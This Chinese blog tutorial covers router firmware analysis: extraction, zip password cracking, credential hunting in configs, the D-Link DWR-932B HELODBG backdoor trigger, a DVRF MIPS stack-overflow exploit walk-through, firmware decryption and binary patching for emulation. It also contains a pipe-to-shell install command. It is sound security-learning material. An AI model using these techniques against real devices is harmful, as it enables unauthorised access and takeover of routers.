<p>squashfs文件系统头部特征较多，有sqsh、hsqs、qshs、shsq、hsqt、tqsh、sqlz。我们用hexdump搜索特征在文件中的地址</p>
<ul>
<li>hexdump：一个二进制文件的查看工具，可转为OCT、DEC、HEX进制查看<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210621132510.png" alt="20210621132510"></li>
</ul>
<p>得到如下搜索结果<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210621133748.png" alt="20210621133748"></p>
<p>hsqs位于文件的0xe20c0，用dd命令截取出固件：</p>
<ul>
<li>注：dd命令中skip指定的值只能为十进制。用shell转换进制可以使用：$((BASE#NUM))</li>
<li><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624255953284.png" alt="1624255953284"></li>
</ul>
<p>得到了一个squashfs格式的文件<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210621134851.png" alt="20210621134851"><br>
用unsquashfs解压得到squashfs-root，即用binwalk提取出的同名文件。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624255856853.png" alt="1624255856853"></p>
<p>如果遇到binwalk之类的工具无法提取的情况，大多都是经过混淆，需要进一步处理</p>
<h2 id="Binwalk如何进行提取：">Binwalk如何进行提取：</h2>
<p>通过maigc特征集与文件进行比对，但识别效率比file命令高多了<br>
特征集：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1JlRmlybUxhYnMvYmlud2Fsay90cmVlLzYyZTljYWExNjQvc3JjL2JpbndhbGsvbWFnaWM=">https://github.com/ReFirmLabs/binwalk/tree/62e9caa164/src/binwalk/magic<i class="fa fa-external-link-alt"></i></span></p>
<p>识别过程主要使用libmagic库的4个函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">magic_t</span> <span class="title">magic_open</span><span class="params">(<span class="keyword">int</span> flags)</span></span>;<span class="comment">//创建并返回一个magic cookie指针。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">magic_close</span><span class="params">(<span class="keyword">magic_t</span> cookie)</span></span>;<span class="comment">//关闭magic签名数据库并释放所有使用过的资源。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="title">magic_buffer</span><span class="params">(<span class="keyword">magic_t</span> cookie,<span class="keyword">const</span> <span class="keyword">void</span> *buffer,<span class="keyword">size_t</span> len)</span></span>;<span class="comment">//读取buffer中指定长度的数据并与magic签名数据库进行对比，返回对比结果描述。</span></span><br><span class="line"></span><br><span class="line"><span class="function">Int <span class="title">magic_load</span><span class="params">(<span class="keyword">magic_t</span> cookie,<span class="keyword">const</span> <span class="keyword">char</span> *filename)</span></span>;<span class="comment">//从filename指定文件加载magic签名数据库，Binwalk把多个magic签名文件组合到一个临时文件中用于加载</span></span><br></pre></td></tr></table></figure>
<h1>0x2 静态分析</h1>
<p>给了个从Dlink固件里提取的样本，打开发现被加密了，得爆破。</p>
<p>kali自带了一些关于压缩文件的工具，比如生成字典用的crunch、rsmangler，爆破用的frackzip等，这些工具用法都不难</p>
<ul>
<li>crunch:<span class="exturl" data-url="aHR0cHM6Ly9ieXN0YXJ0LmNuL2luZGV4LnBocC8xNy9saW51eC8wNw==">Kali使用crunch生成密码字典 - 青檬小栈 <i class="fa fa-external-link-alt"></i></span><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624260673155.png" alt="1624260673155"></li>
</ul>
<p>直接用frackzip破解，（根据教程的提示）得到密码beUT9Z</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624261882922.png" alt="1624261882922"></p>
<p>解压得到以下文件</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624262791018.png" alt="1624262791018"></p>
<ul>
<li>.mbn：高通的一套用于加载网络环境的文件（modem software configuration）</li>
<li>.yaffs2：针对NAND芯片设计的嵌入式文件系统，可用unyaffs提取</li>
</ul>
<p>unyaffs提取yaffs2</p>
<p>核心应该是2K-mdm-image-mdm9625.yaffs2，不确定的话可以把三个.yaffs2都提取了（然后就该复习一下嵌入式系统的目录结构了）</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624264395101.png" alt="1624264395101"></p>
<p>接下来查看配置文件，有可能从配置文件中发现敏感信息</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624264784960.png" alt="1624264784960"></p>
<blockquote>
<p>其中的inadyn-mt.conf文件引起了我们注意，这是no-ip应用的配置文件，no-ip就是一个相当于花生壳的东西，可以申请动态域名</p>
</blockquote>
<p>cat 一看，果然no-ip的用户名和密码都出现了（这么明显真的难以置信）</p>
<p>接下来使用firmwalker来自动化遍历</p>
<blockquote>
<p>Firmwalker:</p>
<p>A simple bash script for searching the extracted or mounted firmware file system.</p>
<p>It will search through the extracted or mounted firmware file system for things of interest such as:</p>
<ul>
<li>etc/shadow and etc/passwd</li>
<li>list out the etc/ssl directory</li>
<li>search for SSL related files such as .pem, .crt, etc.</li>
<li>search for configuration files</li>
<li>look for script files</li>
<li>search for other .bin files</li>
<li>look for keywords such as admin, password, remote, etc.</li>
<li>search for common web servers used on IoT devices</li>
<li>search for common binaries such as ssh, tftp, dropbear, etc.</li>
<li>search for URLs, email addresses and IP addresses</li>
<li>Experimental support for making calls to the Shodan API using the Shodan CLI</li>
</ul>
<p>（其实就相当于一个遍历查找后缀、内容的批处理脚本）</p>
</blockquote>
<p>使用脚本获得所有可能可以利用的文件（建议进入脚本目录执行）</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624270973127.png" alt="1624270973127"></p>
<p>除了配置文件外，分析存在风险的二进制程序也很重要。</p>
<p>在etc/init.d目录下存放启动时运行的程序和脚本，其中有一个叫start_appmgr，mgr一般指固件的主控。查看脚本：</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624273313162.png" alt="1624273313162"></p>
<p>把appmgr拖到ida<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624273441470.png" alt="1624273441470"></p>
<p>凭借一点点pwn的经验，我们发现了一个backdoor<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624273657173.png" alt="1624273657173"></p>
<p>这个漏洞被收录到CVE-2016-10178：<span class="exturl" data-url="aHR0cHM6Ly9waWVycmVraW0uZ2l0aHViLmlvL2Jsb2cvMjAxNi0wOS0yOC1kbGluay1kd3ItOTMyYi1sdGUtcm91dGVycy12dWxuZXJhYmlsaXRpZXMuaHRtbA==">Multiple vulnerabilities found in the Dlink DWR-932B (backdoor, backdoor accounts, weak WPS, RCE …) - IT Security Research by Pierre (pierrekim.github.io)<i class="fa fa-external-link-alt"></i></span></p>
<p>即向192.168.1.1:39889发送HELODBG可以直接getshell（不太清楚为啥是39889端口，静态看了好久没看出来，<s>猜测是跟下图和label_66有关</s>）</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624281330648.png" alt="1624281330648"></p>
<p>update:用Ghidra搜到了<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624282660256.png" alt="1624282660256"></p>
<p>这个漏洞确实明显2333</p>
<p>这个固件还有好几个漏洞，太拉了吧Orz…</p>
<h1>0x3 动态分析</h1>
<h2 id="QEMU和Firmadyne">QEMU和Firmadyne</h2>
<p>QEMU这个模拟器想必都不陌生，一个近乎能够模拟所有硬件设备的软件；倒是第一次听说Firmadyne这个工具，查了一下是一个基于QEMU的分析平台，包含模拟、固件提取、调试等功能，但似乎支持的硬件设备较少？orz</p>
<h2 id="部署Firmadyne">部署Firmadyne</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tutorial里用的是attifyti提供的Ubuntu 14（因为作者说部署这玩意太麻烦了），但Firmadyne的作者在项目的某个issue里说了句“Ubuntu 14 也太早了”之类的话，于是打算自己部署一下</span><br><span class="line">Also，如果想用直接用attifyti的AttifyOS，https://github.com/adi0x90/attifyos，目前的系统基于Ubuntu18.04，官方的下载地址在谷歌网盘</span><br></pre></td></tr></table></figure>
<h3 id="准备">准备</h3>
<p>因为涉及到GitHub上一些项目的下载，网络不太好的话可能需要一些帮助：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">clash on kali:</span><br><span class="line">下载clash并运行：https://github.com/Dreamacro/clash/releases</span><br><span class="line">导入节点：wget -O ~/.config/clash/config.yaml  clash_url</span><br><span class="line"></span><br><span class="line">配置代理：</span><br><span class="line">gsettings set org.gnome.system.proxy mode &#x27;manual&#x27;</span><br><span class="line">gsettings set org.gnome.system.proxy.http port 7890</span><br><span class="line">gsettings set org.gnome.system.proxy.http host &#x27;127.0.0.1&#x27;</span><br><span class="line">gsettings set org.gnome.system.proxy.socks port 7891</span><br><span class="line">gsettings set org.gnome.system.proxy.socks host &#x27;127.0.0.1&#x27;</span><br><span class="line">gsettings set org.gnome.system.proxy ignore-hosts &quot;[&#x27;localhost&#x27;, &#x27;127.0.0.0/8&#x27;, &#x27;::1&#x27;]&quot;\</span><br><span class="line"></span><br><span class="line">进行配置，访问：</span><br><span class="line">http://clash.razord.top/</span><br></pre></td></tr></table></figure>
<p>** 注：以下绕了好多弯，最后也没成功，用了AttifyOS 😅😅😅😅😅</p>
<h3 id="【方案1】安装Firmadyne">【方案1】安装Firmadyne</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils</span><br><span class="line">apt-get install busybox-static fakeroot git dmsetup kpartx netcat-openbsd nmap python-psycopg2 python3-psycopg2 snmp uml-utilities util-linux vlan</span><br><span class="line">git clone --recursive https://github.com/firmadyne/firmadyne.git</span><br><span class="line">cd ./firmadyne</span><br><span class="line">./download.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>配置Postgresql：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 安装数据库</span><br><span class="line">sudo apt-get install postgresql</span><br><span class="line"># 创建用户,注意要设置密码为 firmadyne</span><br><span class="line">sudo -u postgres createuser -P firmadyne</span><br><span class="line"># 创建数据库</span><br><span class="line">sudo -u postgres createdb -O firmadyne firmware</span><br><span class="line"># 初始化数据库</span><br><span class="line">sudo -u postgres psql -d firmware &lt; ./firmadyne/database/schema</span><br></pre></td></tr></table></figure>
<p>如果出现如下错误</p>
<blockquote>
<p>could not connect to database template1: could not connect to server: No such file or directory.</p>
<p>Is the server running locally and accepting</p>
<p>connections on Unix domain socket “var/run/postgresql/.s.PGSQL.5432”?</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624444045680.png" alt="1624444045680"></p>
<p>有可能是没有初始化数据库（至少我是因为这个），用如下方法解决：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 设置postgres用户的密码</span></span><br><span class="line">passwd postgres</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建postgresql的文件夹</span></span><br><span class="line">sudo mkdir /data</span><br><span class="line">sudo chmod o+w /data</span><br><span class="line">su - postgres</span><br><span class="line">mkdir /data/postgresql</span><br><span class="line">mkdir /data/postgresql/data</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> postgres用户初始化数据库</span></span><br><span class="line">/usr/lib/postgresql/13/bin/initdb -D /data/postgresql/data</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动数据库</span></span><br><span class="line">/usr/lib/postgresql/13/bin/pg_ctl -D /data/postgresql/data -l logfile start</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">查看是否监听了端口(结果应类似下图)</span></span><br><span class="line">netstat -nlp |grep 5432</span><br><span class="line"></span><br><span class="line">参考：https://www.cnblogs.com/0x200/p/14026460.html</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624443670290.png" alt="1624443670290"></p>
<p>接下来应该就能按照官方的Usage来使用了（没试）：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Zpcm1hZHluZS9maXJtYWR5bmUjdXNhZ2U=">firmadyne: Platform for emulation and dynamic analysis of Linux-based firmware <i class="fa fa-external-link-alt"></i></span></p>
<h3 id="【方案2】安装firmware-analysis-plus">【方案2】安装<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpeWFuc29uZzIwMTgvZmlybXdhcmUtYW5hbHlzaXMtcGx1cw==">firmware-analysis-plus<i class="fa fa-external-link-alt"></i></span></h3>
<p>因为用Firmadyne直接进行调试比较麻烦，所以用了FAP这个项目。</p>
<p>这是个国人写的中文项目，没啥好说的：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpeWFuc29uZzIwMTgvZmlybXdhcmUtYW5hbHlzaXMtcGx1cw==">liyansong2018/firmware-analysis-plus: 开源固件仿真平台，使用 firmadyne 一键模拟固件 (github.com)<i class="fa fa-external-link-alt"></i></span></p>
<p>安装作者提供的binwalk的时候一直报错(kali2021 &amp; ubuntu18 both)，导致一直卡在提取固件的步骤（emmmm哪位大哥部署成功后教我一下)</p>
<p><img src="https://user-images.githubusercontent.com/29673689/123412395-21b98c00-d5e4-11eb-9f18-48bfe66710b9.png" alt="image"></p>
<p>对此提了个issue</p>
<h3 id="【方案3】AttifyOS">【方案3】AttifyOS</h3>
<p>这个方法比较稳，自己部署也太折磨人了（外加考试周给娃弄傻了）</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624627289020.png" alt="1624627289020"></p>
<p><em>注：密码是attify</em></p>
<h2 id="模拟执行固件">模拟执行固件</h2>
<p>模拟固件运行：</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624627931880.png" alt="1624627931880">通过192.168.0.50即可访问固件</p>
<h2 id="调试固件">调试固件</h2>
<p>这个部分用到了Damn Vulnerable Router Firmware这个项目，大小400M+，建议上gitee clone</p>
<p>安装以下工具：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install gdb-multiarch</span><br><span class="line">wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh</span><br><span class="line">sudo pip3 install capstone unicorn keystone-engine</span><br></pre></td></tr></table></figure>
<p>进入DVRF/Firmware/，用binwalk提取DVRF_v03.bin</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624632998578.png" alt="1624632998578"></p>
<p>提取出来的目录里有个文件夹pwnable，里面存放着漏洞程序示例，选取stack_bof_01程序进行实验，程序的源代码可以在DVRF/Pwnable Source/Intro/里查看</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624633241653.png" alt="1624633241653"></p>
<p>首先用reasdelf查看程序架构</p>
<p>!<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624633746613.png" alt="1624633746613"></p>
<p>（顺手试了一下checksec，这里居然有装😀）</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624633809906.png" alt="1624633809906"></p>
<p>拷贝qwmu-mipsel-static到固件根目录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp (which qemu-mipsel-static) .</span><br></pre></td></tr></table></figure>
<p>用qemu虚拟运行stack_bof_01：</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624694537916.png" alt="1624694537916"></p>
<p>以调试的方式启动程序，并在1234端口进行监听：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01</span><br></pre></td></tr></table></figure>
<p>打开一个新的shell，运行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-multiarch pwnable/Intro/stack_bof_01</span><br><span class="line"></span><br><span class="line"># 设置架构</span><br><span class="line">set architecture mips</span><br><span class="line"></span><br><span class="line">#设置调试端口</span><br><span class="line">target remote 127.0.0.1:1234</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624704034068.png" alt="1624704034068"></p>
<p>创建trash触发溢出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pattern create 300</span><br></pre></td></tr></table></figure>
<p>带上它重新进行调试</p>
<p>gdb attach后继续让程序运行，触发vul</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624704529132.png" alt="1624704529132"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624714926982.png" alt="1624714926982"></p>
<p>接下来就直接ret2system，但经过尝试后发现，如果直接把跳转地址设置为后门函数dat_shell的起始地址0x400950会触发异常</p>
<p>查看函数汇编代码（MIPS…看不懂的话可以边看边学一波，<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZseWluZ3FyL2FydGljbGUvZGV0YWlscy83MDczMDg4">MIPS 通用寄存器_flyingqr的专栏-CSDN博客_mips寄存器<i class="fa fa-external-link-alt"></i></span>；<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZ2xvZGVhcnMvcC85NzYyNjE1Lmh0bWw=">MIPS汇编指令集 - 深海之炎 - 博客园 <i class="fa fa-external-link-alt"></i></span>；<span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2xpeWFuZnUvbXE2NXBiL2J2N3hiNQ==">MIPS的汇编指令 · 语雀 <i class="fa fa-external-link-alt"></i></span>）</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624718994151.png" alt="1624718994151"></p>
<p>调试中发现，当执行到0x400970时，gp寄存器指向了不可访问的地址</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624724526947.png" alt="1624724526947"></p>
<p>而gp的值是由上一条指令得到的</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624724654160.png" alt="1624724654160"></p>
<p>本来执行后v0要指向 指向__DT_MIPS_BASE_ADDRESS的指针</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624727049941.png" alt="1624727049941"></p>
<p>简单来说就是强行跳转到backdoor之后，因为t9（默认在运行中指向当前函数的起始地址）没有发生改变，导致在执行0x400970时产生异常访问</p>
<p>但可以发现（其实是按照exp来推…）main函数中的gp在-0x7fe4后刚好指向PTR__DT_MIPS_BASE_ADDRESS*（猜测原因是源代码中后门函数在main函数后面且没有被调用，导致编译时认为main函数和后门函数的 gp和表的偏移 相等）</p>
<p>于是得到<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624730236282.png" alt="1624730236282"></p>
<hr>
<p>update：</p>
<p>main函数中<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624731700885.png" alt="1624731700885"><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624731779105.png" alt="1624731779105"></p>
<p>所以gp在函数执行完毕后依旧指向的是基地址表</p>
<hr>
<p><em>感觉对于mips程序的分析，Ghidra比IDA好用些</em></p>
<p>从这题也能看出mips和x86、x64的不同之处，<strong>除了这种特殊情况外，大多数情况下还是应该寻找gadget来进行跳转改变t9寄存器</strong></p>
<p><strong>这一节就到这，DVRF这个项目还设计了一些别的漏洞程序可以再进行分析</strong></p>
<h1>0x4 解密固件</h1>
<p>访问dlink的ftp服务器获得几个DIR-882的固件（图中选中的文件），时间跨度为2017~2020年</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624626949169.png" alt="1624626949169"></p>
<p>解压得到固件和对应的版本说明</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624772939989.png" alt="1624772939989"></p>
<h2 id="加密固件发布方案">加密固件发布方案</h2>
<p>一般来说，有三种发布固件的方案</p>
<ul>
<li>出厂时未加密，解密例程在高版本固件v1.1中给出，为后续的加密固件做准备<br>
对于这个方案，我们可以通过解密v1.1来获得解密例程</li>
<li>出厂时的固件已经加密，供应商决定更改高版本固件的加密方式，并发布了包含解密例程的未加密中间版本v1.2<br>
这一方案与上面那个类似</li>
<li>出厂时的固件已经加密，供应商决定更改高版本固件的加密方式，并发布了包含解密例程的使用原加密方式加密的过渡版本v1.3<br>
这种方案对获取解密例程的难度较大，可从硬件中直接提取固件或对发布的v1.3进行分析</li>
</ul>
<p>DIR-882的固件发布方案为第一种，示意图如下<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624781752755.png" alt="1624781752755"></p>
<p><em>虽然个人认为第三种方案才是较为常见的，但教程中并没有讲到。猜测除了从硬件中提取外，还可以通过模拟器模拟然后进行patch或拿头还原</em></p>
<h2 id="解密过程">解密过程</h2>
<p>用binwalk分析最新和最早的两个固件<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624781656552.png" alt="1624781656552"></p>
<p>经过binwalk分析，FW104B02正是存在解密程序的中间版本（从文件名也能看出）</p>
<blockquote>
<p>对于判断固件是否被加密/混淆还可以使用之前提到的binwalk -E 来查看文件各个区域的熵值</p>
</blockquote>
<p>提取该固件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">binwalk -eM DIR882A1_FW104B02_Middle_FW_Unencrypt.bin  </span><br></pre></td></tr></table></figure>
<p>在最终目录下搜索找到imgdecrypt，从名字看出是下个版本固件的解密例程<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624790960410.png" alt="1624790960410"></p>
<p>可以静态分析程序的解密算法，也可以直接运行程序来对加密固件进行解密。</p>
<p>在本地运行时依旧需要借助qemu-mipsel-static模拟器，使用方法和上一节的模拟过程类似，不表。</p>
<p>利用imgdecrypt还可以还原出ftp服务器上提供的最新的固件，所以可能后续版本和Dlink其它型号的路由器也能用这个程序还原固件？Orz</p>
<h1>0x5 修复固件运行环境</h1>
<p>有一些固件因为硬件依赖等原因导致qemu和firmadyne之类的软件无法正确模拟</p>
<p>比如下面这个</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp://ftp2.dlink.com/PRODUCTS/DIR-605L/REVA/DIR-605L_FIRMWARE_1.13.ZIP</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624798081527.png" alt="1624798081527"></p>
<blockquote>
<p>模拟固件运行的实质其实就是把固件的Web程序跑起来，而模拟失败则说明Web程序运行出错了，我们接下来就要看看Web程序报错的原因以及如何修复运行环境。</p>
</blockquote>
<h2 id="尝试运行固件">尝试运行固件</h2>
<p>首先binwalk提取固件，进入文件系统目录squashfs-root-0</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624842375040.png" alt="1624842375040"></p>
<p>找到web服务程序Boa</p>
<blockquote>
<p>Boa程序是一个轻量级的web服务器程序，常见于嵌入式系统中。dlink就是在boa开源代码的基础上新增了很多功能接口以实现路由器上的不同功能。boa程序的路径为/bin/boa，同时我们发现在/etc/boa路径下还有个boa的密码配置文件，我们可以直接获取到boa加密后的密码。</p>
</blockquote>
<p>用qemu-mips-static运行，结果产生了段错误</p>
<blockquote>
<p>mips 是32位大端字节序</p>
<p>mipsel 是32位小端字节序</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624843310448.png" alt="1624843310448"></p>
<h2 id="分析错误并修复">分析错误并修复</h2>
<blockquote>
<p>注：APMIB 是个Realtek的玩意（原来realtek还有做路由器相关的东西…）</p>
<ul>
<li>apmib_init(), 從 flash 讀出 mib 值寫入 RAM		–<span class="exturl" data-url="aHR0cHM6Ly9qeWhzaGluLnBpeG5ldC5uZXQvYmxvZy9wb3N0LzQ3MTYyMDAy">Realtek apmib library @ 邱小新の工作筆記 <i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>有些CVE（如CVE-2019-19823）就跟APMIB有关		–<span class="exturl" data-url="aHR0cHM6Ly9zcGxvaXQudGVjaC8yMDE5LzEyLzE2L1JlYWx0ZWstVE9UT0xJTksuaHRtbA==">TOTOLINK and other Realtek SDK based routers - full takeover (sploit.tech)<i class="fa fa-external-link-alt"></i></span></p>
<p>MIB：management information base，与SNMP有关，可在维基里进一步了解：<span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTWFuYWdlbWVudF9pbmZvcm1hdGlvbl9iYXNl">Management information base - Wikipedia<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>由于没有flash，导致读mib失败</p>
<p>拖到反编译工具中分析。先定位到字符串“Initialize AP MIB failed!”的位置。注意到在输出这个字符串前有个调用APMIB初始化的跳转，在此下断点，IDA远程调试</p>
<p>QEMU的远程调试不需要gdbserver，-g 指定端口，ida 远程调试选项指定相应端口就行<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624891866217.png" alt="1624891866217"><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624891907810.png" alt="1624891907810"></p>
<p>简单调试后发现，程序进入APMIB初始化函数后将返回值赋给v0，返回后对返回值进行判断。（跟着教程做完后，发现其实用静态分析看的就很明显，但多调试总是没有坏处的嘛）</p>
<p>跳转回去的位置在这：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624898602074.png" alt="1624898602074"></p>
<p>我们先试试看把原来的跳转patch一下能不能运行正常固件boa。</p>
<p>有以下两个可行方案：</p>
<ol>
<li>hxd（或其他二进制编辑器），把benz（0x14，不为0跳转）改为beqz（0x10，为0跳转）<br>
这个方法比较直接，定位到指令后把0x14改为0x10即可</li>
<li>Ghidra，把bne改为beq（Ghidra中反编译出的原指令为bne）</li>
</ol>
<ul>
<li><strong>如何用Ghidra进行patch并保存：</strong></li>
</ul>
<ol>
<li>下载python脚本<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NjaGxhZndhbmRsZXIvZ2hpZHJhX1NhdmVQYXRjaA==">ghidra_SavePatch<i class="fa fa-external-link-alt"></i></span> 并放到Ghidra存放python脚本的目录（找不到目录的话，如图）。<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624946914008.png" alt="1624946914008"></li>
<li>按照下图导入脚本。</li>
<li>patch<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624947011340.png" alt="1624947011340"></li>
<li>光标放在更改的指令，在script manager里运行脚本。</li>
</ol>
<p>参考：<span class="exturl" data-url="aHR0cHM6Ly9tYXRlcmlhbHMucmFuZ2Vmb3JjZS5jb20vdHV0b3JpYWwvMjAyMC8wNC8xMi9QYXRjaGluZy1CaW5hcmllcy8=">Patching Binaries With Ghidra – RangeForce<i class="fa fa-external-link-alt"></i></span></p>
<ul>
<li><strong>不用ida的原因：</strong></li>
</ul>
<p>把patch保存到文件中时，发现报错，稍微搜了一下，依然不知道是啥原因orz</p>
<blockquote>
<p>418228: has no file mapping (original: 14 patched: 10)…skipping…</p>
</blockquote>
<p>再次运行试试，发现又报错了：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624968893594.png" alt="1624968893594"></p>
<p>再放到Ghidra里分析，依旧通过字符串定位错误触发点。<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624969614083.png" alt="1624969614083"></p>
<p>两个函数（调用的地方位于websAspInit）里的报错由open函数造成（图为create_chklist_file()，但两个报错类似，均为一开始打开某个文件出错）<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624972065509.png" alt="1624972065509"></p>
<p>用IDA调试发现报错后仍然继续运行，异常发生在执行apmib_get()时：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624973987614.png" alt="1624973987614"></p>
<p>具体在0x4084c9b0时，把[0+v0]里的值赋给v1，而0x1001明显是一个访问不了的地址<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624975561050.png" alt="1624975561050"><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624976989927.png" alt="1624976989927"></p>
<p>查一下apmib_get是干啥的。似乎是用来获取硬件配置信息，但我们要想让固件跑起来可以不需要这个。那么直接把获得apmib_get入口后的跳转语句nop掉<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624977950116.png" alt="1624977950116"></p>
<p>重新尝试运行<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624982108789.png" alt="1624982108789"><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624978566220.png" alt="1624978566220"></p>
<p>固件会一直尝试朝 ioctl（设备驱动的控制接口）发送0x89f0（应该是一个SIOCDEVPRIVATE），我们模拟的固件并不支持，但没啥大影响。（用Google搜一下“Unsupported ioctl: cmd=0x89f0”可以找到一些蛮有意思的东西2333）</p>
<blockquote>
<p>关于ioctl：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW5zaGFucHQvYXJ0aWNsZS9kZXRhaWxzLzE5ODk3ODk3">ioctl()函数详解_shanshanpt的专栏-CSDN博客<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>查看报错的页面（用vim看代码舒服一些），嗯，前端的东西：</p>
